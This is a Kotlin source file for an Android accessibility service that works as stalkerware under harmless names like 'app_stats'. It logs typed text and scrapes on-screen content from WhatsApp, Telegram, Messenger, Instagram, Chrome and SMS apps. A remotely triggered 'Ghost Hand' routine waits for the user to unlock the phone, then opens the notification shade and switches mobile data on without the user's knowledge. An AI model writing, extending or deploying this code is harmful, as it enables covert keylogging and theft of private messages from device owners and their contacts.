package com.example.myandroid

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    // DYNAMIC THROTTLE
    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // --- 1. GHOST HAND LOGIC (High Priority) ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- 2. STANDARD MONITORING ---
        // Throttle Check
        val now = System.currentTimeMillis()
        if (now < nextAllowedCheck) return

        val pkgName = event.packageName?.toString() ?: return

        // Typing Metrics
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        // Gatekeeper Rule Check
        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) {
            return
        }

        // Extract Text
        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val pm = packageManager
            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            // Deduplication Logic
            val historyStr = prefs.getString("text_history_by_app", "{}")
            val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
            val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

            val newTxt = textContent.take(100).toString()
            val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
            
            if (newTxt != lastTxt) {
                nextAllowedCheck = now + 500 // Active User = Fast Polling
                
                val entry = JSONObject()
                entry.put("ts", now)
                entry.put("txt", newTxt)
                appArray.put(entry)
                while (appArray.length() > 20) appArray.remove(0)
                
                rootJson.put(appName, appArray)
                prefs.edit()
                    .putString("text_history_by_app", rootJson.toString())
                    .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                    .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                    .apply()
            } else {
                nextAllowedCheck = now + 3000 // Static User = Slow Polling
            }
        }
    }

    // --- GHOST HAND IMPLEMENTATION ---
    fun engageGhostHand() {
        isGhostActive = true
        println("GHOST HAND: Engaged")
        
        // Check Keyguard
        val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        if (km.isKeyguardLocked) {
            // Wait for user to unlock (We monitor TYPE_WINDOW_STATE_CHANGED)
            println("GHOST HAND: Waiting for unlock...")
            return
        }
        
        // If already unlocked, strike immediately
        performSwipeDown()
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // If we were waiting for unlock, and now window changed to launcher or app
        if (isGhostActive && !isLookingForToggle) {
             val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
             if (!km.isKeyguardLocked) {
                 performSwipeDown()
             }
        }

        // If shade is open, look for toggle
        if (isLookingForToggle && event.packageName == "com.android.systemui") {
            val root = rootInActiveWindow ?: return
            val found = findAndClickToggle(root)
            if (found) {
                // Mission Accomplished
                Handler(Looper.getMainLooper()).postDelayed({ 
                    performGlobalAction(GLOBAL_ACTION_BACK) 
                }, 300)
                isGhostActive = false
                isLookingForToggle = false
            }
        }
    }

    private fun performSwipeDown() {
        if (!isLookingForToggle) {
            isLookingForToggle = true
            performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
        }
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // Check text/desc
        val text = (node.text ?: node.contentDescription ?: "").toString()
        if (targetKeywords.any { text.contains(it, ignoreCase = true) }) {
            // Found match! check if clickable
            var clickableNode = node
            while (!clickableNode.isClickable && clickableNode.parent != null) {
                clickableNode = clickableNode.parent
            }
            if (clickableNode.isClickable) {
                clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
        }

        // Recursion
        for (i in 0 until node.childCount) {
            if (findAndClickToggle(node.getChild(i))) return true
        }
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) {
            sb.append(node.text).append(" ")
        }
        for (i in 0 until node.childCount) {
            extractText(node.getChild(i), sb)
        }
    }

    override fun onInterrupt() {}

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf(
            "com.google.android.apps.messaging", "com.samsung.android.messaging",
            "com.whatsapp", "org.telegram.messenger", "org.telegram.plus",
            "com.imo.android.imoim", "com.truecaller", "com.android.chrome",
            "com.facebook.orca", "com.instagram.android"
        )
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}